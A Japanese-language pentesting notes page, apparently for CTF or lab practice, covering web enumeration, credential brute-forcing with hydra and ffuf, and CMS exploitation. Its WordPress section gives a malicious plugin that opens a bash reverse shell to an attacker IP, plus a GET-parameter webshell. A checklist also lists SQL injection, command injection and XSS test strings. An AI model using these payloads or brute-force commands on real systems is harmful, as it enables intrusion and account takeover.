- 関連ノート：
	- [SQL Injection](../Common/SQL%20Injection.md)

---

# Web scanning / Enumeration

## Webテックスタックのスキャン

テクノロジースタックや、mailアドレス、ドメイン名などを列挙
	（Wappalyzerでは同じ目的を遂行可能かつPassiveなのでステルスだが、whatwebの方が可読性良好）
```zsh
whatweb -v -a3 --log-verbose WebEnum/whatweb.txt http://<TargetIP>
```
- `-a3`：アグレッシブ度（1～4）
- ターゲットがhttpsの場合で"ERROR Opening:xxx- SSL_read: unexpected eof while reading"というエラーが出たら、解決策はないので、`curl -k https:...`で代替する
- 💥PHP 5.xはShellshockに脆弱な可能性あり

## ディレクトリ探索

推奨アプローチ：
1. まずGobusterで1階層の高速スキャン
2. 気になるディレクトリ(301ステータス、api等)が見つかったらFeroxbusterで再帰的に深掘り

Gobuster：[👻Gobuster](../../Tools/👻Gobuster.md)
```zsh
# ファイルアクセスエラー回避のため、同時に開けるファイルの最大数を調整
ulimit -n 8192

gobuster dir -u http://<TargetIP>:<Port>/ -r -k -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -t 100 -o WebEnum/gobuster.txt -x '<extensions>'
```

FeroxBuster：[🦝FeroxBuster](../../Tools/🦝FeroxBuster.md)
```zsh
# ファイルアクセスエラー回避のため、同時に開けるファイルの最大数を調整
ulimit -n 8192

# 再帰スキャン
feroxbuster -u http://<TargetIP>:<Port>/ --depth <num> -r -k -w  /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt --auto-tune -o WebEnum/feroxbuster.txt -x '<extensions>'
```

>[!WARNING] 注意
>レスポンスのステータスを絞ることは、表層が403で内部は200のようなパスを見逃すことにつながる

## 脆弱性のスキャン

nikto：[👽Nikto](../../Tools/👽Nikto.md)
```zsh
nikto -Format htm -o WebEnum/nikto.html --maxtime=180s -C all -h <TargetIP>
```

Nmap：[Port Scan & Vuln Scan](../Common/Port%20Scan%20&%20Vuln%20Scan.md#NSE)
```zsh
sudo nmap --script "http-*" <TargetIP> -p <Port>
```

---

## ☑️チェックリスト(要編集_20250520)

- [ ] searchsploitでサーバソフトやWebスタックの脆弱性をチェック
- [ ] `/robots.txt` や `/sitemap.xml` に注目すべきディレクトリやファイルがあるか確認
	- ※Gobusterのwordlist(`dirb/common.txt`)で列挙済み
- [ ] 開発者ツールでHTMLコメントやソースコードをチェックしjuicy infoを探す
    - [ ] シークレット／パスワード
    - [ ] 注目ディレクトリ
    - [ ] 使用されているライブラリ
    - [ ] すべてのリンク
    - [ ] バージョン情報
- [ ] SSL証明書からDNSサブドメインやメールアドレスを調査
- [ ] Apache VirtualHost（または nginx/IIS の同等機能）に注意！ `/etc/hosts` にすべての(サブ)ドメインをTarget IPで登録
- [ ] デフォルト／一般的な認証情報でログイン試行
- [ ] 認証バイパス(SQLi)：`' or 1=1 -- #` などで試行
- [ ] 悪意ある文字でSQL/NoSQLインジェクションのテスト：`'")}$%%;\`: [SQL Injection](../Common/SQL%20Injection.md#悪意のある文字を使ったテスト（"Bad%20Chars"）)
- [ ] コマンドインジェクションをテスト：
    - [ ] 区切り文字: `; | & || &&`
    - [ ] クオート解除: `" '`
    - [ ] UNIXサブシェル: `$(cmd), >(cmd), \`cmd``
- [ ] URLクエリや任意ファイルアップロードでパストラバーサルのテスト
- [ ] LFI/RFIのテスト（特にURLクエリパラメータで）
- [ ] すべての入力フィールド、URLクエリ、HTTPヘッダでXSSテスト
    - [ ] フィルタ通過後に残る内容を確認: `'';!--"<XSS>=&{()}`
    - [ ] `<script>alert(1)</script>` のバリエーションを試す

---

# Web Credential Bruteforcing

まず、デフォルト／一般的な認証情報でログイン試行したか？

## CEWLで単語・メール抽出

メールアドレスがあれば`emails.txt`に、それ以外のユーザー名候補は`cewl.txt`に保存する
```zsh
cewl -e --email_file emails.txt -m 5 -w cewl.txt http://<TargetIP>
```

## Webフォーム（POST）をブルートフォース

hydra POST
```zsh
hydra -V -f -l <username> -P <wordlist> <TargetIP> http-post-form "/<login_path>:<username_param>=^USER^&<pw_param>=^PASS^:<failure_message>" -t 64
```
- 参考ノート：[🐉THC-Hydra](../../Tools/🐉THC-Hydra.md)

hydra GET(BASIC認証)
```zsh
hydra -u -L [userlist] -P [passwordlist] "http-get://<TargetIP>/<path>:A=BASIC"
```

fuff(Proxy経由のブルートフォース時)
```zsh
ffuf -x socks5://localhost:1080 -u http://<TargetIP>/login -X POST -w <wordlist> -d "<username_param>=<username>&<pw_param>=FUZZ&RememberMe=true" -fw <failure_len>
```
```zsh
ffuf -x socks5://localhost:1080 -u http://<TargetIP>/login -X POST -w /usr/share/seclists/Passwords/2020-200_most_used_passwords.txt -d "Username=admin&Password=FUZZ&RememberMe=true" -fw 6719
```

- 補足：CSRFトークン付きのフォームをブルートフォースするときは、🔗[patator - github](https://github.com/lanjelot/patator)を使う

---
---

# CMS Enumeration x Exploit

## Wordpress

### Enumeration

- [📓WPScan](../../Tools/📓WPScan.md#基本スキャン)
- ターゲット環境にアクセスできるなら、`wp-config.php`に認証情報がないか探す
- 🔗参考： [Wordpress cheat sheet - HackTricks](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/wordpress.html)

### Exploit

(a)  `/wp-admin`にアクセスし、`admin:admin`もしくは所有クレデンシャルでログイン試行

(b) shell獲得のために、プラグインをアップロードする

#### reverse shell

1. リスナーを開く
```zsh
sudo nc -lvnp 4444
```

2. ペイロードを作成する
```php
<?php 
	/*
	Plugin Name: [プラグイン名]
	*/

system("bash -c 'bash -i >& /dev/tcp/[AttackerIP]/[Port] 0>&1'");
?>
```
	コメント部分は必須。wordpressがプラグイン名を識別する。
	プラグインヘッダーという。

3. zip化する
```zsh
zip <output_name> <filename>
```

4. アップロード→Activate Pluginし、リバースシェルを獲得

#### Webshell

1. ペイロードを作成
```php
<?php 
	/*
	Plugin Name: [プラグイン名]
	*/

echo sysetm($_GET["cmd"]); 
?>
```
- 補足：以下のパスに、webshellのペイロードがある
	- `/usr/share/seclists/Web-Shells/WordPress/plugin-shell.php`

2. zip化する
```zsh
zip [output name] [filename]
```

3. アップロード→Activate Plugin
4. 格納先で実行
```
http://[Target]/wp-content/plugins/[プラグイン名]/[ファイル名]?cmd=id
```

## Misc

### JoomScan

Joomla CMSを使っているとき
- [ ] -ecを指定せず、-uのみ指定すると脆弱性を検出するのか？

1. JoomScanを実行
```zsh
# /cmsや/cms/administratorも存在すれば、IPの後ろに付与するとより確実な情報を表示
joomscan -ec -u <TargetIP>
```

2. componentのバージョンを特定する
	- （joomscanの特定したパスにアクセスし、xmlファイルにアクセス）
```xml
...
<authorUrl>www.joomla.org</authorUrl>
<version>4.0.0</version>
```

3. component名とバージョン情報でExploit DBでPoC探索（Joomla Coreの脆弱性は少ない）

### droopescan

Drupal CMSを使っているとき
```zsh
droopescan scan drupal http://$TargetIP -t 32
```
- [コンパイル・ビルド](../../Misc/コンパイル・ビルド.md#Python%20Package%20Management%20(pip))

---

# Trouble shooting

## Burp SuiteではWebサイトにアクセスできないとき

CLIからcurlを使う

- POSTリクエスト
```zsh
curl -X POST https://example.com -d 'field1=value1&field2=value2'
```

- POSTリクエスト x パラメタのエンコード
```zsh
curl -X POST https://example.com --data-urlencode 'field1=value' --data-urlencode 'field2=value2'
```

- curlで正常にアクセスできるのにBurp Suiteでアクセスできない場合は、Burp SuiteのHTTPリクエストヘッダの誤りを考慮し、正常にアクセスできるcurlコマンドに`-v`をつけてヘッダを確認する
```zsh
curl -v http://example.com
```
	↓
```http
GET / HTTP/1.1
HOST: example.com
User-Agent: example

...
```

## Nmapではアクセスできるのにブラウザからはアクセスできないとき

- IPアドレスミス
- httpsになっていないか
- 接続が悪く、タイムアウトしている可能性があるので、mtuを下げる
```zsh
sudo ifconfig tun0 mtu 1250
```